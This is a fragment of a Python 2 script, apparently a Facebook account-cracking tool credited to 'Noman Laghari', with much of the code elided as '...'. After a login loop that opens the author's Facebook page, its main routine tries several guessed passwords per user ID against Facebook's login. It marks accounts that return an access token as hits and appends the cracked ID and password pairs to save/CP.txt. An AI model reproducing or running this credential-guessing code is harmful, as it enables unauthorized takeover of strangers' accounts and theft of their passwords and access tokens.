...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
            ...
            time.sleep(1)
            os.system('xdg-open https://www.facebook.com/NOMI.SINDHI.0')
            os.system('clear')
            loop = 'false'
    else:
...
|___|_||_|\__/_||_|_||_|_|_\_|                             ​                                                                                     
 ...
 Facebook :          Noman Laghari
 ​GitHub   :        NOMAN-LAGHARI
 ​Version  :              2.0
 ​______________________________________________
 ​                                                 """ 
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[92m  [LAGHARI_OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m  [LAGHARI _CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m  [LAGHARI_OK] ' + k + c + user + '  |  ' + pass2
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m  [LAGHARI_OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
